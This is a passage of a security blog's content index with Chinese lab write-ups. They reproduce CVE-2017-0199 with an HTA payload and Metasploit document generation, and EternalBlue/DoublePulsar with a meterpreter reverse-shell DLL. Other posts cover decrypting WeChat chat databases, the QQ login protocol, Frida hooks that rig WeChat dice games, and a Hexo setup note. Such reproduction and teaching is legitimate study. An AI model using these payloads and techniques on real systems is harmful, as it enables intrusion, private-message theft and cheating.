参考[1]https://www.exploit-db.com/exploits/41891/[2]http://bobao.360.cn/learning/detail/3041.html","tags":[{"name":"MS17-010","slug":"MS17-010","permalink":"https://fuping.site/tags/MS17-010/"},{"name":"Metasploit","slug":"Metasploit","permalink":"https://fuping.site/tags/Metasploit/"},{"name":"Ngrok","slug":"Ngrok","permalink":"https://fuping.site/tags/Ngrok/"}]},{"title":"CVE-2017-0199漏洞复现过程","date":"2017-04-18T02:43:57.000Z","path":"2017/04/18/CVE-2017-0199漏洞复现过程/","text":"记录一下过程，周日已经出了结果，但是过程忘记了，抽空再次实现了一下。结尾附上利用MSF生成exploit（外国黑客城会玩）。 准备工作一台apache服务器（这里我用Kali）、POC和一个Word文档。POC内容大概如下： 1234&lt;script&gt;a=new ActiveXObject(\"WScript.Shell\");a.run('%windir%\\\\System32\\\\cmd.exe /c calc.exe', 0);window.close();&lt;/script&gt; Word文档内容任意。 然后将其放在Kali服务器上Apache需要开启DAV支持，具体命令如下 1234a2enmod dav a2enmod dav_fs a2enmod dav_lock a2enmod headers 测试过程在web目录新建ms文件夹，将test.docx复制到ms目录下，并重命名为test.rtf 12root@kali:~/Documents# cp test.docx /var/www/html/ms/test.rtf 新建Word文档，插入对象如图 并保存为rtf文件，如233.rtf删除服务器上的test.rtf文件并将poc.hta文件复制到ms目录下，并改名为test.rtf 12root@kali:/var/www/html/ms# rm -rf test.rtf root@kali:~/Documents# cp poc.hta /var/www/html/ms/test.rtf 修改Apache配置 1234567&lt;Directory /&gt; Dav on &lt;/Directory&gt; &lt;Directory /var/www/html/ms/&gt; Header set Content-Type \"application/hta\" &lt;/Directory&gt; 并重启服务器service apache2 restart 打开233.rtf文档 双击word文档的文字，将会有惊喜弹出 打开文档就弹出的话需要将\\object\\objautlink\\rsltpict修改为\\object\\objautlink\\objupdate\\rsltpict 再次打开文件 彩蛋（MSF下的实现）在kali下执行。首先更新msf到最新。（假设你们都完成了这个过程） 下载利用脚本1root@kali:/usr/share/metasploit-framework/modules/exploits/windows/fileformat# wget https://raw.githubusercontent.com/nixawk/metasploit-framework/3d082814cbedc065f329498b9c6fb7951f8ebbd5/modules/exploits/windows/fileformat/office_word_hta.rb 然后msf下执行命令reload_all重新加载模块 下载rtf文件到/usr/share/metasploit-framework/data/exploits目录 123cd /usr/share/metasploit-framework/data/exploitswget https://raw.githubusercontent.com/nixawk/metasploit-framework/3d082814cbedc065f329498b9c6fb7951f8ebbd5/data/exploits/cve-2017-0199.rtf 开启hta服务123msf &gt; use exploit/windows/misc/hta_servermsf exploit(hta_server) &gt; show optionsmsf exploit(hta_server) &gt; run 生成exploit文档12345msf exploit(hta_server) &gt; use exploit/windows/fileformat/office_word_htamsf exploit(office_word_hta) &gt; show optionsmsf exploit(office_word_hta) &gt; set TARGETURI http://192.168.232.134:8080/4Jmy4cmcZZV7pwi.htamsf exploit(office_word_hta) &gt; set FILENAME msf.docmsf exploit(office_word_hta) &gt; run 将生成的msf.doc文件复制到windows上，打开即可获取一个会话 如下所示 WIndows下结果 Kali下结果 附加如何判断是否受到影响（2017.04.19）新建word文档-&gt;插入-&gt;对象-&gt;对象-&gt;由文件创建在文件名中输入获取的hta链接，并选中链接到文件如果出现如下结果，则说明受到影响 如果仅仅出现下面的弹窗，则说明不受影响，就不需要接下来的测试了。。 主机和虚拟机镜像采用的同一套系统，Office用的也一样，但是虚拟机不可以，而主机可以。我也不知道为啥···· 参考文章http://rewtin.blogspot.nl/2017/04/cve-2017-0199-practical-exploitation-poc.html?m=1https://github.com/rapid7/metasploit-framework/pull/8254","tags":[{"name":"CVE-2017-0199","slug":"CVE-2017-0199","permalink":"https://fuping.site/tags/CVE-2017-0199/"},{"name":"office漏洞","slug":"office漏洞","permalink":"https://fuping.site/tags/office%E6%BC%8F%E6%B4%9E/"},{"name":"Msf","slug":"Msf","permalink":"https://fuping.site/tags/Msf/"}]},{"title":"方程式漏洞利用之SMB","date":"2017-04-15T13:01:45.000Z","path":"2017/04/15/方程式漏洞利用之SMB/","text":"测试过程中发现了许多问题，导致不成功，记录一下过程以及在其中遇到问题的解决方法 环境搭建| 主机 | IP |备注||——–|——–|| Win7 64位 | 192.168.232.133 |靶机（开启smb）||XP|192.168.232.128|攻击机1||Kali|192.168.232.134|攻击机2| 攻击机软件安装1.下载https://github.com/x0rz/EQGRP_Lost_in_Translation/tree/master/windows2.安装Python2.6 32位 安装后，运行fb.py，发现错误ImportError: No module named win32pipe 搜索后提示需要安装pywin32-216.win32-py2.6.exe，下载地址https://sourceforge.net/projects/pywin32/files%2Fpywin32/选择对应的版本。结果又发现错误 切换到Python的安装目录的Scripts下，执行命令pywin32_postinstall.py -install 运行fb.py报错，在fb.py同目录下创建listeningposts文件夹即可 验证过程运行fb.py后输入靶机和攻击机XP的IP，新建或者用之前的项目之后一路回车，需要操作的地方已经标记选择SMB工具模块，使用命令use Eternalblue选择目标系统输入命令use Doublepulsar 在Kali上生成dll文件，命令如下 1msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.232.134 LPORT=5555 -f dll &gt; s.dll 然后copy到XP系统中，记下位置，如C:\\s.dllkali上运行msf，具体命令如下 12345678msf &gt; use exploit/multi/handlermsf exploit(handler) &gt; set LHOST 192.168.232.134LHOST =&gt; 192.168.232.134msf exploit(handler) &gt; set LPORT 5555LPORT =&gt; 5555msf exploit(handler) &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcpPAYLOAD =&gt; windows/x64/meterpreter/reverse_tcpmsf exploit(handler) &gt; exploit 在XP上输入dll文件的位置，一路回车显示Doublepulsar Succeeded 查看kali上发现已经反弹shell 了 结束语现在网上已经有很多文章了，这里只是自己验证一下实现的过程，记录一下。其实复现也很容易，只需要输入IP地址和一些选项即可，就是搭建环境的时候有许多错误，注意一下就行了。这里有视频可以看一下https://v.qq.com/iframe/player.html?vid=g0393qtgvj0&amp;tiny=0&amp;auto=0","tags":[{"name":"方程式","slug":"方程式","permalink":"https://fuping.site/tags/%E6%96%B9%E7%A8%8B%E5%BC%8F/"},{"name":"SMB漏洞","slug":"SMB漏洞","permalink":"https://fuping.site/tags/SMB%E6%BC%8F%E6%B4%9E/"}]},{"title":"QQ登录简单分析，附易语言登录代码","date":"2017-04-10T13:58:29.000Z","path":"2017/04/10/QQ登录简单分析，附易语言登录代码/","text":"这里参考了QQ登录的组件 1http://ui.ptlogin2.qq.com/cgi-bin/login?hide_title_bar=0&amp;low_login=0&amp;qlogin_auto_login=1&amp;no_verifyimg=1&amp;link_target=blank&amp;appid=636014201&amp;target=self&amp;s_url=http%3A//www.qq.com/qq2012/loginSuccess.htm QQ登录有两种情况，一种是需要验证码，一种是不需要验证码。需要验证码的稍微复杂一点，这里首先介绍一下不需要验证码的情况。 一、无需验证码第一步：获取 login_sig这是登录所需要的第一步，无论是否需要验证码，都需要进行这一步。访问如下地址： 1http://ui.ptlogin2.qq.com/cgi-bin/login?hide_title_bar=0&amp;low_login=0&amp;qlogin_auto_login=1&amp;no_verifyimg=1&amp;link_target=blank&amp;appid=636014201&amp;target=self&amp;s_url=http%3A//www.qq.com/qq2012/loginSuccess.htm 从返回的Cookie中获取 pt_login_sig的值，这个值就是login_sig 第二步：获取 checkVC这个字符串中包含了多个内容。有是否输入验证码的标志、verifycode、salt和pt_verifysession_v1（不需要输入验证码的情况下）。请求地址： 1http://check.ptlogin2.qq.com/check?regmaster=&amp;pt_tea=2&amp;pt_vcode=1&amp;uin=QQ号码&amp;appid=636014201&amp;js_ver=10197&amp;js_type=1&amp;login_sig=GsmtnCcla5xHKS********T0U0npqlnD4bzXEMed&amp;u1=http%3A%2F%2Fwww.qq.com%2Fqq2012%2FloginSuccess.htm&amp;r=0.23528769960244944&amp;pt_uistyle=40 其中参数uin是登录的qq号码，login_sig是从第一步获取的值。当然这种情况是在QQ号输入正确，并且不需要输入验证码时。返回的内容如下： 1ptui_checkVC(&#39;0&#39;,&#39;!BAF&#39;,&#39;\\x00******\\x64\\x21\\x97\\x92&#39;,&#39;e9825f1e232302e01414bf9c37ac7d44942a40c89daaf5604ab11d54fff32445ad89e315e30a610e0aa77f46afedbaad83819c14230e7ec2&#39;,&#39;2&#39;); 第一个值表示是否需要图片验证码，0表示不需要 第二值是verifycode，登录时需要 第三个值是salt，QQ转换而来 第四个值是pt_verifysession_v1 第三步：登录输入密码后点登录，请求包为： 1http://ptlogin2.qq.com/login?u=QQ号码&amp;verifycode=!BAF&amp;pt_vcode_v1=0&amp;pt_verifysession_v1=e9825f1e232302e01414bf9c37ac7d44942a40c89daaf5604ab11d54fff32445ad89e315e30a610e0aa77f46afedbaad83819c14230e7ec2&amp;p=w79Tqqx2glOF9meNNWhz5Ouow23EGt3zEl-y8vpVGFuHT6HJaFtRhVDlbpMj4a6plyrnIvW73uGXzVDwSt2e9wMHyFt9crtZ-N0xUx2wxFUen03ybw5HxzkPti3VyjSffID8GNkhDn1yYVPa1lyjHED2DCVd3rl9bysBPb*1imLSYY3jkQJpsXPS2kjxxlVxFBVHEHnSGSYaA3QBMXQ*NyQw7MkhVDsO7X8aljR0eApa*lgHoBsC4g3mTtEKcU5aslpcO4EPdUey0QA4YVh9zLzbLnkPJklcQYvoxlv6kLdYmoyORcVTM6IKqles7t5ot0mRWzjW923hV3X0PLRb6g__&amp;pt_randsalt=2&amp;u1=http%3A%2F%2Fwww.qq.com%2Fqq2012%2FloginSuccess.htm&amp;ptredirect=0&amp;h=1&amp;t=1&amp;g=1&amp;from_ui=1&amp;ptlang=2052&amp;action=4-8-1488010172151&amp;js_ver=10197&amp;js_type=1&amp;login_sig=GsmtnCcla5xHKSrRZ7ek0VU5-63oyUvqLk65vxoIG0kOFBT0U0npqlnD4bzXEMed&amp;pt_uistyle=40&amp;aid=636014201&amp; 参数名称 说明 u 用户输入。第二步骤中 uin的值 verifycode 第二步中ptui_checkVC第二个值。(这里的是!BAF) pt_verifysession_v1 第二步中ptui_checkVC第四个值。即e9825f1…. p 加密后的密码 login_sig 第一步中返回Cookie中的 pt_login_sig值 pt_randsalt pt_randsalt=0 旧版加密 ；pt_randsalt=2 新版RSA加密 密码加密的js代码地址http://imgcache.qq.com/ptlogin/ver/10197/js/c_login_2.js，注意看js版本，这里是js_ver为10197 密码加密需要三个参数，第一个是pwd（用户密码），第二个是salt（第二步中获取ptui_checkVC 中的第三个值），第三个是verifycode（第二步中ptui_checkVC第二个值 ） 用户名密码正确返回： 1ptuiCB(&#39;0&#39;,&#39;0&#39;,&#39;http:&#x2F;&#x2F;www.qq.com&#x2F;qq2012&#x2F;loginSuccess.htm&#39;,&#39;0&#39;,&#39;登录成功！&#39;, &#39;QQ昵称&#39;); 用户名密码错误返回： 1ptuiCB(&#39;3&#39;,&#39;0&#39;,&#39;&#39;,&#39;0&#39;,&#39;您输入的帐号或密码不正确，请重新输入。&#39;, &#39;&#39;); 附上一张登录成功的截图 二、需要输入验证码第一步：获取login_sig与上面无需验证码一样，就省略了。 第二步：获取cap_cd请求： 1http://check.ptlogin2.qq.com/check?regmaster=&amp;pt_tea=2&amp;pt_vcode=1&amp;uin=987654321&amp;appid=636014201&amp;js_ver=10197&amp;js_type=1&amp;login_sig=KVSX9JmFKqCXlNi85SLXJnj5DqKPDzAYGwW3X5d3Wcnxd885YPFSeDU7ul15aTQp&amp;u1=http%3A%2F%2Fwww.qq.com%2Fqq2012%2FloginSuccess.htm&amp;r=0.8539291708517738&amp;pt_uistyle=40 返回 1ptui_checkVC(&#39;1&#39;,&#39;yrAL1AMRbUpQGrsQxy6HMhVQ1YIf--U0zK5wNm_wTOYi2YIrxt5H5w**&#39;,&#39;\\x00\\x00\\x00\\x00\\x3a\\xde\\x68\\xb1&#39;,&#39;&#39;,&#39;2&#39;); cap_cd的值为yrAL1AMRbUpQGrsQxy6HMhVQ1YIf--U0zK5wNm_wTOYi2YIrxt5H5w** 第三步：获取sess请求： 1http://captcha.qq.com/cap_union_new_gettype?aid=636014201&amp;asig=&amp;captype=&amp;protocol=http&amp;clientype=2&amp;disturblevel=&amp;apptype=2&amp;curenv=inner&amp;uid=987654321&amp;cap_cd=yrAL1AMRbUpQGrsQxy6HMhVQ1YIf--U0zK5wNm_wTOYi2YIrxt5H5w**&amp;lang=2052&amp;callback=_aq_453849 uid是qq号，cap_cd由第二步获取 返回： 1_aq_453849(&#123;&quot;capclass&quot;:&quot;0&quot;,&quot;subcapclass&quot;:&quot;0&quot;,&quot;src&quot;:&quot;cap_union_new_show&quot;,&quot;sess&quot;:&quot;XiUr_hV-3RVfwQc2_01i1vZOI3BJdVr8AfA3-ZYIFztXD58CSfYICY_kwrJjpmvRtuAfMX50sJGC0c0D8W2kig**&quot;&#125;) 第四步：获取visg请求： 1http://captcha.qq.com/cap_union_new_show?aid=636014201&amp;asig=&amp;captype=&amp;protocol=http&amp;clientype=2&amp;disturblevel=&amp;apptype=2&amp;curenv=inner&amp;sess=XiUr_hV-3RVfwQc2_01i1vZOI3BJdVr8AfA3-ZYIFztXD58CSfYICY_kwrJjpmvRtuAfMX50sJGC0c0D8W2kig**&amp;noBorder=noborder&amp;showtype=embed&amp;uid=987654321&amp;cap_cd=yrAL1AMRbUpQGrsQxy6HMhVQ1YIf--U0zK5wNm_wTOYi2YIrxt5H5w**&amp;lang=2052&amp;rnd=925999 第五步：获取图片验证码访问地址： 1http://captcha.qq.com/cap_union_new_getcapbysig?aid=549000912&amp;asig=&amp;captype=&amp;protocol=http&amp;clientype=2&amp;disturblevel=&amp;apptype=2&amp;curenv=inner&amp;sess=” ＋ sess ＋ “&amp;noBorder=noborder&amp;showtype=embed&amp;uid=” ＋ uin ＋ “&amp;cap_cd=” ＋ cap_cd ＋ “&amp;lang=2052&amp;rnd=117715&amp;rand=0.5497459754332915&amp;vsig=” ＋ vsig ＋ “&amp;ischartype=1 第六步：验证验证码，获取verifycode和pt_verifysession_v1post请求：http://captcha.qq.com/cap_union_new_verify?random=1488013134675 提交内容： 1aid=636014201&amp;asig=&amp;captype=&amp;protocol=http&amp;clientype=2&amp;disturblevel=&amp;apptype=2&amp;curenv=inner&amp;sess=XiUr_hV-3RVfwQc2_01i1vZOI3BJdVr8AfA3-ZYIFztXD58CSfYICY_kwrJjpmvRtuAfMX50sJGC0c0D8W2kig**&amp;noBorder=noborder&amp;showtype=embed&amp;uid=QQ号码&amp;cap_cd=yrAL1AMRbUpQGrsQxy6HMhVQ1YIf--U0zK5wNm_wTOYi2YIrxt5H5w**&amp;lang=2052&amp;rnd=925999&amp;subcapclass=0&amp;vsig=g3GflfnCicbaqub3e-SVo2azImuo1gDzQfnGkRnhI-uqLlIXtY6XyXE1dDjUBJHOXCPewnnTo-4mPTtRjScTD9uZaPu4z3x1Jj6inepPQ8l8KCeFeN9laBpiWdqaOF4Eg&amp;cdata=0&amp;collect=OD6q9t0AraWJf%2Bdtq0j8VvuOrjmT8T%2F%2FW8E83RE208unUG0TO1T5psMsZH1p5SXS12WpjU2CcGKHMsp7fciMTLiLY3wUwJBjBxWSqfu%2FbhfCTKUtJdBPeE6P%2FsRfdwemWRYRQwRgdvXZuc42JOqfDIfD%2F2%2B2GeYYxOPohbqY%2BWcW%2Fcut%2BGLcKpJGFTzBtPzKDLU6fTPn6MC%2FNiRGWGehwTy52MK0dIVdd5BYlPQrhFrvrhaisRISHiH%2FhViF7iFpZm5ZclBD5rjqQ4r1O8%2BBDRSB4feMaP2S1Usd0uGrMnVFT8zX7dV7sT2Y1NQ%2Fk5%2FHP%2BgzBQgHMLuH%2FqdSBz%2Fu9wr7oT6Xb0edOUBjPrw55yhZM1R%2FxEJSNwap2f77XRxbJWH%2BFtEuWBC2Gve3MIn9L9loCqk%2Fe0XoGGy%2FuEDvHfEHRCchzaWKH3Hlr5MehOI4WaaPgmbj%2BBeSbcY%2BmDIc1TJ%2BhQmsRf5DoqlqiCuKNQLuX1XS1e3cnfM3%2BonkBImxaqx%2BlTG0HxWAV0Ntsn%2B0%2BeErZleVNI9VIZgIOHDxNkiaG3BucPL1SRuPNtgcNgGFpvYmFqTqPrR%2FgYDPobzlxy%2FcMVEALYB%2FogbH4gy%2FZP7xczjXypgdvtTawokxTUopmKyXVCwvA0coEQzWLW1EQfMsWPNZcA2p58oaelGA3FBlgkZ2iUnx4qukKEZQ7vKFie8VKFBelfNSp6aXcezYbnDbeFHYOAvLeXPriaZ5qBQzNADUtyj%2FhTsY%2BbvmnwCAGT%2F%2BMYeyd9VFWPEbR8cj%2FrRDEEWc0wdd5BOoHzix%2Bz2Uif9512VwHn9%2Bp3KXAnrK1O%2FQ6HRB7YS9BPyYQvW9ZtpvvKBwOIjf3fx7aqwYqfa7VUzMGv3zkvVA8Bp2JHG2GoQxnVa62ymP3SGshxS4l86ParjFNvepN16O1VaPAidFvqHRXAP14tHMkeC8VTFuqp5cKAY4UdXpPXukOvXPySbdFSPaaAqfIv7%2BckjxFsUPS4cauOx2jif2fQU2maxErLnwrZ10natNklynu5sUn9RSuRDld9v4TNTbyPShDdijM%2BzvpJoMyr4GWiFthB0kZZ2lVnPoqV67VQ%2FPiyCUA9zVbrLSAEOKIz1HQ19I0hdH41fBUPL824xYMdIO1AlZJKGre%2FCvUEgXaHgvbe83QNtFw%2BU946tlGVwR9TCCPltakqyKrT%2F8CtCZ6Mi0qfmFYnF8D7zZBaKxbNgTmMjvwAyz%2F0dMsDi97scJLMYV4w%2Fosk6gvoHEeX6LkbXh5W0aTYTznTSfO2RVfgzWpPiks6rVGzLhfwDyFAyH7%2FOHD7qEWGjnX3fTiBnw5%2FHWqHPJh3Kd%2F4EGe1yE3ZGzxo%2BPETGbcLQaQiiSAaQiFsU5UDoWG1%2FfOjd1Lkjg8D%2FNXuS1BkncxI2Hk%2B4xL0Xa1STqWJGieeyB5DOT9cHYUxEpw1g%3D&amp;ans=ywhm 验证码输入正确返回： 1&#123;\"errorCode\":\"0\" , \"randstr\" : \"@mDo\" , \"ticket\" : \"t026Dii9p2HtKBiYgHwRpwqXFrwWsI3-tta5rc7J3ELr5VgnaORdHXceHsZpmOl6JGRkEQYtUoeJs8KXWym7a0cxuw07929umE9cPo16UNyimo*\" , \"errMessage\":\"OK\"&#125; verifycode为randstr，pt_verifysession_v1为ticket 第七步： 验证用户名密码是否正确请求： 1http://ptlogin2.qq.com/login?u=987654321&amp;verifycode=@mDo&amp;pt_vcode_v1=1&amp;pt_verifysession_v1=t026Dii9p2HtKBiYgHwRpwqXFrwWsI3-tta5rc7J3ELr5VgnaORdHXceHsZpmOl6JGRkEQYtUoeJs8KXWym7a0cxuw07929umE9cPo16UNyimo*&amp;p=A*CEx2PsoaZAYQe7D-5dLmTxdorqI9asO37Wugp2KFHzeEqYpMPh9CHPk7DDzZw5UzD4y1in-ZrSoXLx5kJYe1WGZ7sqhg*ZNJ3DtQ65rXR*I5i*dCAQ-h1fFV*u3AdP8IFAAu*borH*xSYbFZDTQ8TjplD2wan2w8MnDfo3h1AyUL*kpt79FqpCfuXnlaSOyTOzkMceEQczxw5DYzmZDetbMeJMYhoqLhQ0WHxbHUafhOEk1EhBDiqXvfETJvCmSMubGN7W*LIF3JPoYFDOgJmmPWqauGvw7C03ehesfIzeNtm-m5R*QX8HyM4dPp*dc3lRUxF2rMuBPn9EVzaqpg__&amp;pt_randsalt=2&amp;u1=http%3A%2F%2Fwww.qq.com%2Fqq2012%2FloginSuccess.htm&amp;ptredirect=0&amp;h=1&amp;t=1&amp;g=1&amp;from_ui=1&amp;ptlang=2052&amp;action=5-24-1488013134992&amp;js_ver=10197&amp;js_type=1&amp;login_sig=KVSX9JmFKqCXlNi85SLXJnj5DqKPDzAYGwW3X5d3Wcnxd885YPFSeDU7ul15aTQp&amp;pt_uistyle=40&amp;aid=636014201&amp; 带验证码登录可能存在问题，待修改 易语言实现代码","tags":[{"name":"QQ登录","slug":"QQ登录","permalink":"https://fuping.site/tags/QQ%E7%99%BB%E5%BD%95/"},{"name":"易语言","slug":"易语言","permalink":"https://fuping.site/tags/%E6%98%93%E8%AF%AD%E8%A8%80/"}]},{"title":"微信聊天记录读取","date":"2017-04-09T15:21:28.000Z","path":"2017/04/09/微信聊天记录读取/","text":"根据四哥教程来自己动手实现一下如何读取微信的聊天记录。以下操作需要在手机Root的情况下进行。 微信聊天记录保存位置微信聊天记录的数据库文件保存在/data/data/com.tencent.mm/MicroMsg/32位字符串/中，名字为EnMicroMsg.db。 将聊天记录数据库文件导出使用命令： 1adb pull /data/data/com.tencent.mm/MicroMsg/32位字符串/EnMicroMsg.db 直接导出提示不存在，因为是权限的问题。使用adb root没反应，只好将文件copy到一个非root权限可以操作的目录，这里采用了/data/local/tmp文件夹。 1cp EnMicroMsg.db /data/local/tmp/ 然后导出，执行命令adb pull /data/local/tmp/EnMicroMsg.db 提示权限不足，修改权限后导出。 查看SharedPreferences中保存的UIN的值切换到/data/data/com.tencent.mm/shared_prefs目录，然后执行grep -rn &quot;uin&quot; *来查看保存的UIN的值 读取微信数据库文件内容将手机的IMEI和微信用户UIN值进行拼接后进行md5加密，取小写md5的前七位就是微信数据库的密码。用Navicat读取数据库文件是提示错误：这是因为微信数据库用的是SQLCipher开源库提供的加密解密算法，读取数据库文件需要使用SQLCipher这个软件。打开后输入密码，即可看到聊天内容： 参考资料http://blog.csdn.net/jiangwei0910410003/article/details/52238891","tags":[{"name":"微信聊天记录","slug":"微信聊天记录","permalink":"https://fuping.site/tags/%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95/"}]},{"title":"Android HOOK 技术之Frida的初级使用","date":"2017-04-01T11:39:15.000Z","path":"2017/04/01/Android-HOOK-技术之Frida的初级使用/","text":"Frida是一款基于Python + JavaScript 的Hook与调试框架，在Android\\Linux\\Windows等平台均能使用。这里我们以Windows来对Android应用程序进行Hook。Frida的官网地址是：https://www.frida.re。 Windows下Frida的安装 有多种安装方法，这里提供两种，第一种直接使用pip安装，第二种是下载egg文件安装 1.通过pip安装Frida1pip install frida 2.去下载对应平台的egg安装包进行安装下载地址：https://pypi.python.org/pypi/frida当前最新版本为9.1.23，下载对应平台和Python版本的安装包，例如我的系统为Win64，Python为2.7，下载的文件为frida-9.1.23-py2.7-win-amd64.egg。下载后安装即可。 由于网络原因，方法1安装时间太久，这里推荐第二种方法。 安装完成后在Dos窗口输入命令： 1frida-ps 出现类似以下的界面表示安装成功。 Android下Frida环境的搭建 要求：一部Root过的手机或模拟器，最好采用4.4 ARM系统。PS：我真机采用的是魅族4的5.1系统，有些功能实现不了，只好用模拟器来完成。模拟器的具体配置如下图所示。 首先需用下载最新的frida-server，下载地址为：http://build.frida.re/frida-snapshot/android/arm/bin/frida-server。下载后将文件上传到手机中，并赋予执行权限。上传到手机使用如下命令： 1adb push frida-server &#x2F;data&#x2F;local&#x2F;tmp&#x2F; ![adb push](adb push.png) 将frida-server赋予执行权限，命令如下： 1234adb shellsucd &#x2F;data&#x2F;local&#x2F;tmp&#x2F;chmod 777 frida-server 运行Frida-Server 1.&#x2F;data&#x2F;local&#x2F;tmp&#x2F;frida-server 执行frida-ps -U可以看到手机上的进程 使用frida-ps -R 也可以，但是需要进行转发。执行adb forward tcp:27042 tcp:27042后执行frida-ps -R也可以看到手机上的进程 至此，准备工作已经做好，现在来进行对Android上的程序进行Hook了。首先以WX的掷骰子和猜拳头为例。这里采用最新版的WX（6.5.7）。其代码如下所示： 123456789101112131415161718192021222324252627282930313233# -*- coding: utf-8 -*import frida, sysdef on_message(message, data): if message['type'] == 'send': print(\"[*] &#123;0&#125;\".format(message['payload'])) else: print(message)jscode = \"\"\"Java.perform(function () &#123;var be= Java.use(\"com.tencent.mm.sdk.platformtools.bf\");send(\"start\")be.da.implementation = function()&#123; var type = arguments[0]; send(type);//5表示掷骰子，2表示猜拳头 if(type ==2)&#123; return 1;//表示是石头 &#125;else&#123; return 5;//骰子6点 &#125;&#125;;send(\"end\")&#125;);\"\"\"process = frida.get_usb_device().attach('com.tencent.mm')script = process.create_script(jscode)script.on('message', on_message)print('[*] weixin Start...')script.load()sys.stdin.read() 手机上打开微信后，运行代码。然后点击掷骰子，可以看到都是6点，猜拳头全部是石头。 下面来用一个例子来介绍一下，如何来通过Hook的方法修改原来的内容，以及当出现相同方法名时，如何对该方法进行Hook。其Android的Activity代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465package com.test.fridatest;import android.app.Activity;import android.os.Bundle;import android.util.Log;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.Toast;public class MainActivity extends Activity &#123; private Button myButton1; private String TAG = \"fuping\"; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); myButton1 = (Button) findViewById(R.id.button1); myButton1.setOnClickListener( new ButtonClick()); &#125; class ButtonClick implements OnClickListener &#123; public void onClick(View v) &#123; switch (v.getId()) &#123; case R.id.button1: int nRet = test(4); String strRet = nRet + \"\"; Toast.makeText(MainActivity.this, strRet,Toast.LENGTH_LONG).show(); Log.i(TAG, \"test(int):\"+ strRet); strRet = test(4,2)+\"\"; Log.i(TAG, \"test(int,int):\"+ strRet); strRet = test(4,\"2\")+\"\"; Log.i(TAG, \"test(int,String):\"+ strRet); strRet = change(4,\"2\")+\"\"; Log.i(TAG, \"change(int,String):\"+ strRet); break; default: break; &#125; &#125; &#125; public int test(int num) &#123; int nRet = num*2; return nRet; &#125; public int test(int num,int b) &#123; int nRet = num*2 + b ; return nRet; &#125; public String test(int num,String b) &#123; String nRet = num*2 + b ; return nRet; &#125; public String change(int num,String b) &#123; String nRet = num*2 + b ; return nRet; &#125; &#125; 首先演示一下对change方法的hook。hook之前change方法输出的结果为82，预期Hook之后输出的结果应该为164。在真机上运行结果如下所示： 发现Hook之后返回的是null，而且报错。（经过多次给手机系统升级或降级，都无法成功，最后之后在模拟器上测试了） 在模拟器上进行Hook后，出现了预期的结果。在对test方法进行hook时，由于有多个test方法，所以在进行Hook时，需要指定是哪个方法。例如对String test(int num,String b)进行hook时，可以使用如下代码 12345var TM = Java.use(\"com.test.fridatest.MainActivity\");TM.test.overload(\"int\",\"java.lang.String\").implementation = function (a,b) &#123; send(\"Called - test(int,String):\"+a+\"----\"+b); return this.test.overload(\"int\",\"java.lang.String\").call(this,8,\"3\");&#125;; 附上对test和change同时hook 的结果： 就个人而言，针对Frida和Xposed相比，Frida操作更简单，而且不需要重启手机。但相关资料较少，还是需要慢慢学习。 参考资料 https://www.frida.re/docs/examples/android/ https://www.codemetrix.net/hacking-android-apps-with-frida-1/ http://www.cnblogs.com/konf/p/5998785.html","tags":[{"name":"安卓Hook","slug":"安卓Hook","permalink":"https://fuping.site/tags/%E5%AE%89%E5%8D%93Hook/"},{"name":"Frida","slug":"Frida","permalink":"https://fuping.site/tags/Frida/"},{"name":"摇骰子","slug":"摇骰子","permalink":"https://fuping.site/tags/%E6%91%87%E9%AA%B0%E5%AD%90/"}]},{"title":"Hello World","date":"2017-03-19T16:00:00.000Z","path":"2017/03/20/hello-world/","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new blog1$ hexo init Create a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment Question运行hexo server，浏览器输入http://localhost:4000 无法访问 产生原因可能是端口占用。 Windows下运行命令netstat -ano | findstr 4000，看是否有有进程占用了4000端口。 这是安装了福昕PDF阅读器的原因，将Foxitprotect.exe进程结束即可。 安装主题1git clone https://github.com/litten/hexo-theme-yilia.git themes/yilia 修改hexo根目录下的 _config.yml ： theme: yilia 之后运行 12hexo ghexo s 修改头像hexo根目录下source文件夹中新建assets\\img文件夹，将头像文件复制进去修改主题目录中的_config.yml ：avatar: /assets/img/avatar.jpg 添加标签1.添加标签1tag: 标签 2.添加多个标签1tags: [标签1,标签2,标签3] 或者： 123tags: - 标签1 - 标签2 文章部分显示使用&lt;!-- more --&gt;标签来隐藏其下面的内容~","tags":[{"name":"教程","slug":"教程","permalink":"https://fuping.site/tags/%E6%95%99%E7%A8%8B/"},{"name":"主题","slug":"主题","permalink":"https://fuping.site/tags/%E4%B8%BB%E9%A2%98/"}]}]